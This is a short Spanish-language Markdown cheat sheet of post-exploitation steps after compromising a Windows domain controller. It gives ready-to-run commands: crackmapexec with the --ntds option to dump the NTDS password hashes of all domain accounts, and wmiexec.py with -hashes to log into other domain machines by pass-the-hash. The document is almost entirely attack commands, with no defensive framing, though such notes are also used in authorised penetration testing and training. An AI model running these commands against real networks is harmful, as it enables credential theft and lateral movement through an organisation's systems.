# Cosas que hacer despues de comprometer el DC

## Dumpear el hash ntds de todos los equipos.
```
crackmapexec smb <ip_DC> -u 'Administrator' -p 'P@$$w0rd!' --ntds
```

## Pass The Hash
Esto te permitirá conectarte a los equipos del dominio sin proporcionar contraseña, hay varias herramientas para ello como wmiexec.py.
```
wmiexec.py <dominio>/<usuario>@<ip> -hashes <hash_ntds>
```
